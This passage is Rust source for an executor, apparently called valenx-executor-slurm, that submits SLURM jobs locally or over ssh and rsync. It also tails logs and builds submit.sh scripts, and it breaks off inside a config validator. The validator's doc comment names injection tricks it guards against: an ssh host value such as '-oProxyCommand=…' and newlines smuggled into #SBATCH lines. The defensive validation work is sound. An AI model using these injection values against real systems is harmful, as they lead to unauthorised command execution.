//! # valenx-executor-slurm
//!
//! [`valenx_core::Executor`] implementation that submits prepared
//! jobs to a SLURM cluster via `sbatch` and polls them via
//! `squeue`. RFC 0009 §"SlurmExecutor."
//!
//! Lifecycle:
//!
//! 1. [`SlurmExecutor::submit`] writes a `submit.sh` script next
//!    to the prepared workdir, calls `sbatch submit.sh`, parses
//!    the `Submitted batch job <N>` reply.
//! 2. [`SlurmExecutor::poll`] runs `squeue -j <N> -h -o %T` and
//!    maps the SLURM state ("PENDING", "RUNNING", "COMPLETED",
//!    "FAILED", "CANCELLED", "TIMEOUT") to [`RunStatus`].
//! 3. [`SlurmExecutor::cancel`] runs `scancel <N>`.
//!
//! Already landed since the v0 scaffold:
//!
//! - GPU resource declarations (`gres=gpu:1`).
//! - Multi-node `srun` orchestration when `nodes > 1` or
//!   `ntasks_per_node > 1`.
//! - sacct fallback so terminal state isn't optimistic-Completed.
//! - **Remote-cluster submission via [`StagingMode::Rsync`]**:
//!   submit rsyncs the workdir to the configured host and runs
//!   sbatch over ssh; poll / cancel run squeue / sacct / scancel
//!   over ssh too. Local SharedFilesystem mode is unchanged.
//!
//! What's deliberately deferred:
//!
//! - **Result fetch-back leg** — the upload before submit is wired,
//!   the rsync download command is built ([`build_rsync_download_command`])
//!   but isn't auto-invoked when poll() returns Completed. Callers
//!   that want results pulled back run the download command
//!   themselves today; an opt-in "auto-fetch on Completed" knob is
//!   a follow-up.
//! - **Live log streaming** — the existing `subprocess::run` flow
//!   in `valenx-app` handles local-stdout streaming; SLURM jobs
//!   write to `slurm-<jobid>.out` and [`read_slurm_log_tail`] reads
//!   it after the fact. ssh-tail-style streaming during the run is
//!   a follow-up.

#![forbid(unsafe_code)]
#![allow(missing_docs)]

use std::process::Command;

use serde::{Deserialize, Serialize};
use thiserror::Error;

use valenx_core::executor::{Executor, ExecutorError, ExecutorHandle, RunStatus};
use valenx_core::PreparedJob;

/// Per-case `[hpc.slurm]` knobs. Sensible defaults so a minimal
/// SLURM submission works without filling in every field.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct SlurmConfig {
    /// Partition / queue name (`-p`).
    #[serde(default = "default_partition")]
    pub partition: String,
    /// Wall-clock time limit in `H:MM:SS` form (`-t`).
    #[serde(default = "default_time_limit")]
    pub time_limit: String,
    /// Node count (`-N`).
    #[serde(default = "default_nodes")]
    pub nodes: u32,
    /// CPUs per task (`--cpus-per-task`).
    #[serde(default = "default_cpus_per_task")]
    pub cpus_per_task: u32,
    /// Memory per CPU, e.g. "4G" (`--mem-per-cpu`). Empty = let
    /// SLURM pick the partition default.
    #[serde(default)]
    pub mem_per_cpu: String,
    /// Account / billing code (`-A`). Empty = no `-A` flag.
    #[serde(default)]
    pub account: String,
    /// Quality-of-service tier (`--qos`). Empty = no flag.
    #[serde(default)]
    pub qos: String,
    /// Optional `--mail-type` events (e.g. "END,FAIL").
    #[serde(default)]
    pub mail_type: String,
    /// Optional `--mail-user` address.
    #[serde(default)]
    pub mail_user: String,
    /// Optional `--gres` (Generic RESource) spec, e.g. `"gpu:1"`,
    /// `"gpu:a100:2"`, `"gpu:tesla:4"`. Pass-through — the cluster
    /// validates whether the requested resource exists. Empty = no
    /// gres flag (CPU-only allocation).
    #[serde(default)]
    pub gres: String,
    /// Tasks (MPI ranks) per node (`--ntasks-per-node`). Default 1.
    /// Anything > 1 emits the directive AND wraps the command in
    /// `srun` so SLURM actually launches the right rank count
    /// (sbatch alone doesn't fork extra ranks).
    #[serde(default = "default_ntasks_per_node")]
    pub ntasks_per_node: u32,
    /// How the workdir gets to the cluster. Default
    /// `SharedFilesystem` matches the existing assumption (submitter
    /// and compute nodes see the same paths). `Rsync { host,
    /// remote_workdir_root }` opts into uploading the workdir before
    /// submit and pulling results back after the job completes;
    /// the upload / download command builders ship today, the full
    /// ssh-on-remote integration is a follow-up.
    #[serde(default)]
    pub staging_mode: StagingMode,
}

/// Where the workdir lives relative to the compute nodes.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StagingMode {
    /// Submitter and compute nodes share a filesystem — every path
    /// the submitter sees, the cluster also sees. No staging
    /// happens. This is the default; it matches the v0 behavior
    /// and most academic clusters.
    #[default]
    SharedFilesystem,
    /// Stage the workdir to a remote host via rsync before submit
    /// and back after completion. `host` is anything ssh / rsync
    /// accept (`user@host`, `host` if ssh-config has it). Each case's
    /// remote workdir lives at `<remote_workdir_root>/<case-name>`.
    Rsync {
        host: String,
        remote_workdir_root: String,
    },
}

fn default_partition() -> String {
    "default".to_string()
}
fn default_time_limit() -> String {
    "01:00:00".to_string()
}
fn default_nodes() -> u32 {
    1
}
fn default_cpus_per_task() -> u32 {
    1
}
fn default_ntasks_per_node() -> u32 {
    1
}

impl Default for SlurmConfig {
    fn default() -> Self {
        Self {
            partition: default_partition(),
            time_limit: default_time_limit(),
            nodes: default_nodes(),
            cpus_per_task: default_cpus_per_task(),
            mem_per_cpu: String::new(),
            account: String::new(),
            qos: String::new(),
            mail_type: String::new(),
            mail_user: String::new(),
            gres: String::new(),
            ntasks_per_node: default_ntasks_per_node(),
            staging_mode: StagingMode::default(),
        }
    }
}

/// Build the argv that runs `command args...` either locally (when
/// `staging` is `SharedFilesystem`) or via `ssh <host> --
/// command args...` (when `staging` is `Rsync`). Pure function — no
/// subprocess execution, fully testable. Used by submit / poll /
/// cancel to dispatch sbatch / squeue / sacct / scancel through ssh
/// when the workdir lives on a remote cluster.
///
/// The `--` separator after the host stops ssh from parsing later
/// args as its own flags (so `-j` / `-o` / `-h` go to squeue, not ssh).
pub fn build_ssh_wrapped_command(
    staging: &StagingMode,
    command: &str,
    args: &[&str],
) -> Vec<std::ffi::OsString> {
    use std::ffi::OsString;
    match staging {
        StagingMode::SharedFilesystem => {
            let mut argv = Vec::with_capacity(1 + args.len());
            argv.push(OsString::from(command));
            argv.extend(args.iter().map(OsString::from));
            argv
        }
        StagingMode::Rsync { host, .. } => {
            let mut argv = Vec::with_capacity(4 + args.len());
            argv.push(OsString::from("ssh"));
            argv.push(OsString::from(host));
            argv.push(OsString::from("--"));
            argv.push(OsString::from(command));
            argv.extend(args.iter().map(OsString::from));
            argv
        }
    }
}

/// Read the last `n` lines of `<workdir>/slurm-<native_id>.out` —
/// the stdout file SLURM writes for a job (matches the
/// `--output=slurm-%j.out` directive [`build_submit_script`] emits).
///
/// Single-pass tail via a [`std::collections::VecDeque`] ring
/// buffer; never loads more than `n` lines into memory regardless
/// of file size. Trailing empty lines (from the final newline SLURM
/// always writes) are dropped — the result is the last `n` lines
/// with non-empty content. Missing file returns the underlying
/// `io::Error` so callers can distinguish "job hasn't written
/// stdout yet" from "we read 0 useful lines".
///
/// Today this assumes [`StagingMode::SharedFilesystem`] (or that
/// the rsync download leg already pulled the log back). The
/// remote-via-ssh variant lands when the rest of the Rsync flow
/// gets wired in.
pub fn read_slurm_log_tail(
    workdir: &std::path::Path,
    native_id: &str,
    n: usize,
) -> Result<Vec<String>, std::io::Error> {
    use std::collections::VecDeque;
    use std::io::{BufReader, Seek, SeekFrom};
    use valenx_core::io_caps::{read_capped_lines_bounded, MAX_SLURM_LOG_LINE_BYTES};
    let path = workdir.join(format!("slurm-{native_id}.out"));
    let mut file = std::fs::File::open(&path)?;
    // Round-25 M2: pre-fix this did a forward scan through the
    // entire file to populate an `n`-line ring buffer. For a 100 GB
    // log (e.g. a long-running MPI solver with verbose per-step
    // logging) the scan took minutes. The fix: seek from end based
    // on an estimated per-line size, then scan forward from that
    // offset. If the file is smaller than the estimate, we just read
    // the whole file (preserving the old behaviour on small inputs).
    //
    // Estimated per-line size: SLURM log lines average ~120 bytes
    // (timestamps + solver iteration banners + residual rows).
    // 1024 bytes per line is a generous estimate that still trims a
    // 100 GB log to ~100 MiB of tail when `n = 100K`. The bounded
    // line cap (MAX_SLURM_LOG_LINE_BYTES = 4 MiB) is the worst-case
    // line size; using it as the estimate would over-trim and miss
    // legitimate trailing lines when the file holds normal-sized
    // entries. 1 KiB is the sweet spot.
    //
    // Round-26 H2: 1 KiB per line under-estimates a real-world
    // failure mode — a single 20 KiB crash dump line at the tail of
    // an otherwise-empty file would have the round-25 M2 seek land
    // 20 KiB before EOF, BEYOND the start of the long line. We'd
    // discard the (partial) first line and read 0 complete lines
    // → return `Vec::new()`. The fix is a doubling-walk fallback:
    // if the in-window read yields fewer than `n` lines AND we did
    // seek past 0, double `tail_bytes` and rescan. Bounded by
    // `MAX_TAIL_ITERATIONS` (32 doublings = 32 * 1 KiB * n; for
    // `n=1` that's 32 GiB) — sane files terminate in 1-2 rounds.
    const ESTIMATED_LINE_BYTES: u64 = 1024;
    const MAX_TAIL_ITERATIONS: u32 = 32;
    let file_len = file.metadata()?.len();
    // The +1 line of headroom covers the case where the seek lands
    // mid-line (we discard the partial first line below) plus a
    // little slack so callers asking for `n = 1` don't get nothing.
    let mut tail_bytes = (n as u64)
        .saturating_add(1)
        .saturating_mul(ESTIMATED_LINE_BYTES);
    let mut ring: VecDeque<String> = VecDeque::with_capacity(n);
    let mut iterations: u32 = 0;
    // Round-28 H1: the doubling-walk's exit conditions all live on
    // the bottom `if ring.len() >= n || seek_offset == 0 ||
    // iterations >= MAX_TAIL_ITERATIONS { break; }` line below.
    // Iteration K with `seek_offset == 0` already breaks there, so
    // the previous-R27 "early-break for previous_seek_offset ==
    // Some(0)" guard at the top of the loop was structurally
    // unreachable (no iteration ever wrote `Some(0)` into
    // `previous_seek_offset` before the bottom-of-loop assignment,
    // because the bottom break fires first). The R28 fix-pass
    // deleted that dead block and its accompanying
    // `previous_seek_offset` tracking. `seek_offset` is declared
    // outside the loop so the post-loop tracing::debug! can see the
    // final value.
    let mut seek_offset: u64;
    loop {
        seek_offset = file_len.saturating_sub(tail_bytes);
        // If we're trimming anything, seek there. If we land mid-
        // line (which we will unless the offset happens to be 0 or
        // right after a `\n`) we read-and-discard up through the
        // next newline so the ring buffer only ever sees complete
        // lines.
        let discard_first_partial = seek_offset > 0;
        file.seek(SeekFrom::Start(seek_offset))?;
        let reader = BufReader::new(&mut file);
        ring.clear();
        // Round-24 H4: pre-fix `reader.lines()` allocated an
        // unbounded `String` per record. SLURM logs hold solver
        // stdout — an MPI rank looping without flushing newlines
        // for the wall-clock is a real failure mode that would
        // OOM the tail walker before any single legitimate log
        // line was read. `read_capped_lines_bounded` bounds each
        // record at MAX_SLURM_LOG_LINE_BYTES; over-cap records
        // surface as `InvalidData` and stop the iteration without
        // returning partial garbage.
        let mut first = true;
        for line in read_capped_lines_bounded(reader, MAX_SLURM_LOG_LINE_BYTES) {
            let bytes = line?;
            // Round-25 M2: when we seeked past zero we almost
            // certainly landed mid-line; discard the first record
            // so we don't surface a torn prefix to the caller.
            if first && discard_first_partial {
                first = false;
                continue;
            }
            first = false;
            // Strip the trailing \n (and \r if a Windows-CRLF-
            // emitting sbatch wrote the log) the way
            // `BufRead::lines()` would.
            let mut s = String::from_utf8_lossy(&bytes).into_owned();
            if s.ends_with('\n') {
                s.pop();
                if s.ends_with('\r') {
                    s.pop();
                }
            }
            if ring.len() == n {
                ring.pop_front();
            }
            ring.push_back(s);
        }
        // Round-26 H2: doubling-walk exit conditions. We stop
        // when ANY of the following holds:
        //   1. We have enough non-trivial lines for the caller's
        //      ask (`ring.len() >= n`).
        //   2. We already started from offset 0 — there's no
        //      further-back position to seek to, so doubling again
        //      would just re-read the same bytes.
        //   3. We've hit the iteration budget; doubling further
        //      would risk a pathological read on a contrived input
        //      (e.g. a log that's been padded with garbage but
        //      never newlines).
        // Otherwise, double the window and retry. The ring is
        // re-cleared at the top of the next iteration.
        if ring.len() >= n || seek_offset == 0 || iterations >= MAX_TAIL_ITERATIONS {
            break;
        }
        tail_bytes = tail_bytes.saturating_mul(2);
        iterations += 1;
    }
    // Drop trailing empty entries (SLURM emits a trailing newline).
    while ring.back().map(|s| s.is_empty()).unwrap_or(false) {
        ring.pop_back();
    }
    // Round-28 M1: emit a structured trace at the exit of the
    // doubling-walk so operators can see the final iteration count,
    // seek offset, and ring length. The R27 commit advertised this
    // log line but the implementation never landed; the R28 fix-pass
    // adds it where the function returns.
    tracing::debug!(
        iterations,
        seek_offset,
        ring_len = ring.len(),
        "slurm tail walk done"
    );
    Ok(ring.into_iter().collect())
}

/// Build the rsync command that uploads `local_workdir` to the
/// cluster as `<remote_workdir_root>/<basename(local_workdir)>`.
/// The trailing slash on the source path tells rsync to copy the
/// *contents* (not the parent dir name) into the remote target —
/// so the remote workdir's layout matches the local one exactly.
///
/// Returns the argv vector ready for `Command::new(cmd[0]).args(&cmd[1..])`.
/// Pure function: no side effects, fully testable.
pub fn build_rsync_upload_command(
    local_workdir: &std::path::Path,
    host: &str,
    remote_workdir_root: &str,
) -> Vec<std::ffi::OsString> {
    let case_name = local_workdir
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_else(|| "case".to_string());
    let mut src = local_workdir.to_string_lossy().into_owned();
    if !src.ends_with('/') {
        src.push('/');
    }
    let dst = format!("{host}:{remote_workdir_root}/{case_name}");
    vec![
        std::ffi::OsString::from("rsync"),
        std::ffi::OsString::from("-a"),
        std::ffi::OsString::from("--mkpath"),
        std::ffi::OsString::from(src),
        std::ffi::OsString::from(dst),
    ]
}

/// Build the rsync command that downloads `<host>:<remote_workdir>/`
/// back into `local_workdir`. Mirror of [`build_rsync_upload_command`]
/// for the post-completion fetch-back leg.
pub fn build_rsync_download_command(
    host: &str,
    remote_workdir: &str,
    local_workdir: &std::path::Path,
) -> Vec<std::ffi::OsString> {
    let mut src = format!("{host}:{remote_workdir}");
    if !src.ends_with('/') {
        src.push('/');
    }
    vec![
        std::ffi::OsString::from("rsync"),
        std::ffi::OsString::from("-a"),
        std::ffi::OsString::from(src),
        std::ffi::OsString::from(local_workdir.as_os_str()),
    ]
}

/// SLURM-cluster Executor.
pub struct SlurmExecutor {
    config: SlurmConfig,
}

impl SlurmExecutor {
    /// New executor pinned to the given [`SlurmConfig`] (cluster
    /// endpoint, queue, account, sbatch flags).
    pub fn new(config: SlurmConfig) -> Self {
        Self { config }
    }
}

impl Default for SlurmExecutor {
    fn default() -> Self {
        Self::new(SlurmConfig::default())
    }
}

impl Executor for SlurmExecutor {
    fn id(&self) -> &str {
        "slurm"
    }

    fn submit(&self, job: &PreparedJob) -> Result<ExecutorHandle, ExecutorError> {
        if job.native_command.is_empty() {
            return Err(ExecutorError::SubmitFailed {
                executor_id: "slurm".into(),
                reason: "PreparedJob.native_command is empty".into(),
            });
        }
        // Security (defense in depth): reject a config whose fields would be
        // misused in the ssh/rsync argv or the generated submit.sh, before
        // spawning or writing anything. Untrusted case.toml is already
        // validated in `config_from_case_toml`; this also guards configs
        // constructed programmatically by a caller.
        self.config
            .validate()
            .map_err(|e| ExecutorError::SubmitFailed {
                executor_id: "slurm".into(),
                reason: e.to_string(),
            })?;
        std::fs::create_dir_all(&job.workdir).map_err(|e| ExecutorError::SubmitFailed {
            executor_id: "slurm".into(),
            reason: format!("create workdir {}: {e}", job.workdir.display()),
        })?;
        let script = build_submit_script(&self.config, job);
        let script_path = job.workdir.join("submit.sh");
        // R29 H2: write submit.sh through the canonical tmp+fsync+rename
        // helper instead of a bare std::fs::write. A crash mid-write
        // could leave a truncated submit.sh that sbatch then rejects or,
        // worse, silently runs a partial command.
        valenx_core::io_caps::atomic_write_str(&script_path, &script).map_err(|e| {
            ExecutorError::SubmitFailed {
                executor_id: "slurm".into(),
                reason: format!("write submit.sh: {e}"),
            }
        })?;

        // For Rsync mode, stage the workdir to the cluster before
        // sbatch so the script + any inputs the script reads are
        // visible to the compute nodes. The sbatch we run via ssh
        // then references the REMOTE submit.sh path.
        let sbatch_target = match &self.config.staging_mode {
            StagingMode::SharedFilesystem => script_path.to_string_lossy().into_owned(),
            StagingMode::Rsync {
                host,
                remote_workdir_root,
            } => {
                let upload = build_rsync_upload_command(&job.workdir, host, remote_workdir_root);
                let upload_out = Command::new(&upload[0])
                    .args(&upload[1..])
                    .output()
                    .map_err(|e| ExecutorError::SubmitFailed {
                        executor_id: "slurm".into(),
                        reason: format!("spawn rsync: {e} (rsync may not be on PATH)"),
                    })?;
                if !upload_out.status.success() {
                    let stderr = String::from_utf8_lossy(&upload_out.stderr);
                    return Err(ExecutorError::SubmitFailed {
                        executor_id: "slurm".into(),
                        reason: format!(
                            "rsync upload failed ({}): {}",
                            upload_out.status,
                            stderr.trim()
                        ),
                    });
                }
                // The upload uses --mkpath so <root>/<case-name>/ exists.
                let case_name = job
                    .workdir
                    .file_name()
                    .map(|s| s.to_string_lossy().into_owned())
                    .unwrap_or_else(|| "case".to_string());
                format!("{remote_workdir_root}/{case_name}/submit.sh")
            }
        };

        // sbatch dispatch: local for SharedFilesystem, ssh-wrapped
        // for Rsync. current_dir() doesn't apply to the remote shell;
        // the submit script uses `set -euo pipefail` and the remote
        // workdir is implicit in the script path.
        let argv = build_ssh_wrapped_command(
            &self.config.staging_mode,
            "sbatch",
            &[sbatch_target.as_str()],
        );
        let mut cmd = Command::new(&argv[0]);
        cmd.args(&argv[1..]);
        if matches!(self.config.staging_mode, StagingMode::SharedFilesystem) {
            cmd.current_dir(&job.workdir);
        }
        let output = cmd.output().map_err(|e| ExecutorError::SubmitFailed {
            executor_id: "slurm".into(),
            reason: format!(
                "spawn sbatch: {e} (sbatch may not be on PATH; install SLURM or check $PATH)"
            ),
        })?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutorError::SubmitFailed {
                executor_id: "slurm".into(),
                reason: format!("sbatch exited {}: {}", output.status, stderr.trim()),
            });
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        let job_id = parse_sbatch_reply(&stdout).ok_or_else(|| ExecutorError::SubmitFailed {
            executor_id: "slurm".into(),
            reason: format!("couldn't parse sbatch output: {stdout:?}"),
        })?;

        Ok(ExecutorHandle {
            executor_id: "slurm".to_string(),
            native_id: job_id,
            workdir: job.workdir.clone(),
        })
    }

    fn poll(&self, handle: &ExecutorHandle) -> Result<RunStatus, ExecutorError> {
        // Route squeue / sacct via ssh when StagingMode::Rsync —
        // build_ssh_wrapped_command returns the bare command argv
        // for SharedFilesystem and the ssh-wrapped form for Rsync.
        let squeue_argv = build_ssh_wrapped_command(
            &self.config.staging_mode,
            "squeue",
            &["-j", &handle.native_id, "-h", "-o", "%T"],
        );
        let output = Command::new(&squeue_argv[0])
            .args(&squeue_argv[1..])
            .output()
            .map_err(|e| ExecutorError::PollFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!("spawn squeue: {e}"),
            })?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutorError::PollFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!("squeue exited {}: {}", output.status, stderr.trim()),
            });
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        Ok(decide_poll_status(&stdout, || {
            let sacct_argv = build_ssh_wrapped_command(
                &self.config.staging_mode,
                "sacct",
                &["-j", &handle.native_id, "-X", "-P", "-n", "-o", "State"],
            );
            let sacct_out = Command::new(&sacct_argv[0])
                .args(&sacct_argv[1..])
                .output()
                .ok()?;
            if !sacct_out.status.success() {
                return None;
            }
            parse_sacct_reply(&String::from_utf8_lossy(&sacct_out.stdout))
        }))
    }

    fn cancel(&self, handle: &ExecutorHandle) -> Result<(), ExecutorError> {
        // Route scancel via ssh when StagingMode::Rsync.
        let argv =
            build_ssh_wrapped_command(&self.config.staging_mode, "scancel", &[&handle.native_id]);
        let output = Command::new(&argv[0])
            .args(&argv[1..])
            .output()
            .map_err(|e| ExecutorError::CancelFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!("spawn scancel: {e}"),
            })?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutorError::CancelFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!("scancel exited {}: {}", output.status, stderr.trim()),
            });
        }
        Ok(())
    }
}

impl SlurmExecutor {
    /// Pull the cluster-side workdir back to the local workdir
    /// referenced by `handle`. No-op for [`StagingMode::SharedFilesystem`]
    /// (everything is already local). For [`StagingMode::Rsync`] this
    /// runs the [`build_rsync_download_command`] argv against the
    /// configured host.
    ///
    /// Callers invoke this explicitly after poll() returns
    /// `RunStatus::Completed` — auto-invocation in poll() would
    /// break the existing Executor contract (poll is supposed to
    /// be cheap; rsync of a multi-GB workdir isn't). A future
    /// `fetch_on_complete` opt-in could automate this.
    pub fn fetch_results(&self, handle: &ExecutorHandle) -> Result<(), ExecutorError> {
        let StagingMode::Rsync {
            host,
            remote_workdir_root,
        } = &self.config.staging_mode
        else {
            return Ok(()); // SharedFilesystem: nothing to fetch.
        };
        let case_name = handle
            .workdir
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "case".to_string());
        let remote_workdir = format!("{remote_workdir_root}/{case_name}");
        let argv = build_rsync_download_command(host, &remote_workdir, &handle.workdir);
        let output = Command::new(&argv[0])
            .args(&argv[1..])
            .output()
            .map_err(|e| ExecutorError::FetchFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!("spawn rsync (download): {e} (rsync may not be on PATH)"),
            })?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutorError::FetchFailed {
                executor_id: "slurm".into(),
                native_id: handle.native_id.clone(),
                reason: format!(
                    "rsync download failed ({}): {}",
                    output.status,
                    stderr.trim()
                ),
            });
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Helpers (pulled out for unit-testability without sbatch/squeue
// being installed)
// ---------------------------------------------------------------------------

/// Build the `submit.sh` text for a prepared job. Visible for testing.
pub fn build_submit_script(config: &SlurmConfig, job: &PreparedJob) -> String {
    let mut s = String::with_capacity(512);
    use std::fmt::Write;
    let _ = writeln!(s, "#!/bin/bash");
    let _ = writeln!(
        s,
        "# Generated by valenx-executor-slurm — do not edit by hand."
    );
    let _ = writeln!(s, "#SBATCH --partition={}", config.partition);
    let _ = writeln!(s, "#SBATCH --time={}", config.time_limit);
    let _ = writeln!(s, "#SBATCH --nodes={}", config.nodes);
    let _ = writeln!(s, "#SBATCH --cpus-per-task={}", config.cpus_per_task);
    if !config.mem_per_cpu.is_empty() {
        let _ = writeln!(s, "#SBATCH --mem-per-cpu={}", config.mem_per_cpu);
    }
    if !config.account.is_empty() {
        let _ = writeln!(s, "#SBATCH --account={}", config.account);
    }
    if !config.qos.is_empty() {
        let _ = writeln!(s, "#SBATCH --qos={}", config.qos);
    }
    if !config.mail_type.is_empty() {
        let _ = writeln!(s, "#SBATCH --mail-type={}", config.mail_type);
    }
    if !config.mail_user.is_empty() {
        let _ = writeln!(s, "#SBATCH --mail-user={}", config.mail_user);
    }
    if !config.gres.is_empty() {
        let _ = writeln!(s, "#SBATCH --gres={}", config.gres);
    }
    if config.ntasks_per_node > 1 {
        let _ = writeln!(s, "#SBATCH --ntasks-per-node={}", config.ntasks_per_node);
    }
    let _ = writeln!(s, "#SBATCH --output=slurm-%j.out");
    let _ = writeln!(s, "#SBATCH --error=slurm-%j.err");
    let _ = writeln!(s);
    let _ = writeln!(s, "set -euo pipefail");
    // Bring in environment vars from the prepared job. SLURM by
    // default propagates the submitter's env; we add adapter-
    // specific extras explicitly so the cluster-side environment
    // is reproducible regardless of submitter shell.
    for (k, v) in &job.environment {
        let _ = writeln!(
            s,
            "export {}={}",
            k.to_string_lossy(),
            shell_quote(&v.to_string_lossy())
        );
    }
    let _ = writeln!(s);
    // Run the actual command. Multi-node OR multi-task-per-node
    // means MPI-style parallelism; wrap in `srun` so SLURM forks
    // the right rank count (sbatch alone doesn't). Single-node
    // single-task runs bare for clarity.
    let needs_srun = config.nodes > 1 || config.ntasks_per_node > 1;
    let mut cmd_line = String::new();
    if needs_srun {
        cmd_line.push_str("srun ");
    }
    for (i, arg) in job.native_command.iter().enumerate() {
        if i > 0 {
            cmd_line.push(' ');
        }
        cmd_line.push_str(&shell_quote(&arg.to_string_lossy()));
    }
    let _ = writeln!(s, "{cmd_line}");
    s
}

/// Pull the SLURM job id out of the `Submitted batch job <N>` line.
/// `sbatch` may print version banners or other noise — we scan
/// every line and pick the first match.
pub fn parse_sbatch_reply(stdout: &str) -> Option<String> {
    for line in stdout.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("Submitted batch job ") {
            let id: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
            if !id.is_empty() {
                return Some(id);
            }
        }
    }
    None
}

/// Decide the [`RunStatus`] for a job from a squeue line + a lazily-
/// invoked sacct fetcher. Pure-function distillation of `poll()`'s
/// fallback chain so it can be tested without sbatch / sacct on PATH.
///
/// - `squeue_output` non-empty → job is still in the queue, map
///   directly via [`slurm_state_to_run_status`].
/// - `squeue_output` empty + sacct returns Some(state) → job has
///   left the queue, sacct knows its terminal state, map via
///   [`sacct_state_to_run_status`].
/// - `squeue_output` empty + sacct returns None → preserve the v0
///   optimistic-Completed fallback so polling loops don't hang on
///   clusters where accounting is offline.
pub fn decide_poll_status(
    squeue_output: &str,
    sacct_fetch: impl FnOnce() -> Option<String>,
) -> RunStatus {
    let trimmed = squeue_output.trim();
    if !trimmed.is_empty() {
        return slurm_state_to_run_status(trimmed);
    }
    match sacct_fetch() {
        Some(s) => sacct_state_to_run_status(&s),
        None => RunStatus::Completed { exit_code: 0 },
    }
}

/// Parse a `sacct -j <id> -X -P -o State` reply. Returns the first
/// non-blank trimmed line, or `None` when sacct printed nothing (job
/// not found, sacct unavailable, accounting offline). The `+` suffix
/// sacct sometimes appends ("CANCELLED+", meaning the cancel just
/// landed) is preserved here — [`sacct_state_to_run_status`] handles
/// stripping it.
pub fn parse_sacct_reply(stdout: &str) -> Option<String> {
    for line in stdout.lines() {
        let trimmed = line.trim();
        if !trimmed.is_empty() {
            return Some(trimmed.to_string());
        }
    }
    None
}

/// Map a sacct state string to [`RunStatus`]. Strips trailing `+`
/// and any `by <uid>` suffix (sacct emits "CANCELLED by 1234" for
/// user-initiated cancels), then reuses the queue-state mapping.
/// Unlike [`slurm_state_to_run_status`], an empty input is `Failed`
/// here — sacct printing nothing means we couldn't determine the
/// final state, which is fail-loud rather than optimistic-Completed.
pub fn sacct_state_to_run_status(state: &str) -> RunStatus {
    let normalized = state
        .trim()
        .trim_end_matches('+')
        .split_whitespace()
        .next()
        .unwrap_or("");
    if normalized.is_empty() {
        return RunStatus::Failed {
            exit_code: None,
            reason: "sacct returned no terminal state".into(),
        };
    }
    // Reuse the queue-state mapping for everything except the empty
    // case — sacct's terminal states are the same set squeue uses
    // when the job is still in the queue.
    slurm_state_to_run_status(normalized)
}

/// Map a SLURM state string to a [`RunStatus`].
pub fn slurm_state_to_run_status(state: &str) -> RunStatus {
    match state.trim() {
        "" => {
            // Empty squeue output means the job is no longer in the
            // queue — completed, failed, or cancelled. squeue alone
            // can't distinguish; the caller would normally fall back
            // to `sacct -j <id> -X -P -o State` for the final state.
            // For the v0 scaffold we report Completed{0} as the
            // optimistic guess; sacct integration is a follow-up.
            RunStatus::Completed { exit_code: 0 }
        }
        "PENDING" | "CONFIGURING" => RunStatus::Pending,
        "RUNNING" | "COMPLETING" => RunStatus::Running,
        "COMPLETED" => RunStatus::Completed { exit_code: 0 },
        "FAILED" => RunStatus::Failed {
            exit_code: None,
            reason: "SLURM reported FAILED".into(),
        },
        "TIMEOUT" => RunStatus::Failed {
            exit_code: None,
            reason: "SLURM reported TIMEOUT (job hit its time_limit)".into(),
        },
        "OUT_OF_MEMORY" => RunStatus::Failed {
            exit_code: None,
            reason: "SLURM reported OUT_OF_MEMORY (raise mem_per_cpu)".into(),
        },
        "CANCELLED" | "PREEMPTED" | "DEADLINE" => RunStatus::Cancelled,
        other => RunStatus::Failed {
            exit_code: None,
            reason: format!("unknown SLURM state `{other}`"),
        },
    }
}

/// Conservative shell quote — wraps in single quotes and escapes
/// any literal single quote inside. Good enough for the bash-level
/// argv expansion the submit script does.
fn shell_quote(s: &str) -> String {
    if s.is_empty() {
        return "''".to_string();
    }
    if s.chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | '='))
    {
        return s.to_string();
    }
    let escaped = s.replace('\'', "'\\''");
    format!("'{escaped}'")
}

impl SlurmConfig {
    /// Validate every field that flows into command-line argv, an ssh/rsync
    /// host position, or a generated `#SBATCH` script line. Returns
    /// [`SlurmConfigError::Invalid`] (fails loud — never silently sanitizes)
    /// when a value could break out of its intended context.
    ///
    /// This is the security boundary for untrusted `[hpc.slurm]` config
    /// loaded from a project's `case.toml`. It rejects:
    /// - **control characters in `#SBATCH` directive values** — a newline
    ///   would terminate the directive comment line and turn the remainder
    ///   into an executable line in the bash submit script; and
    /// - **an rsync/ssh host that starts with `-`** (ssh/rsync would parse
    ///   it as an option such as `-oProxyCommand=…`, executing a local
    ///   command) or that contains characters outside a safe host set.
    pub fn validate(&self) -> Result<(), SlurmConfigError> {
        for (name, val) in [
            ("partition", &self.partition),
            ("time_limit", &self.time_limit),
            ("mem_per_cpu", &self.mem_per_cpu),
            ("account", &self.account),
            ("qos", &self.qos),
            ("mail_type", &self.mail_type),
            ("mail_user", &self.mail_user),
            ("gres", &self.gres),
        ] {
            if let Some(c) = val.chars().find(|&c| c.is_control()) {
                return Err(SlurmConfigError::Invalid(format!(
                    "{name} contains a control character ({c:?}); newlines / control \
                     characters are not allowed in #SBATCH directive values"
                )));
            }
        }
        if let StagingMode::Rsync {
            host,
            remote_workdir_root,
        } = &self.staging_mode
        {
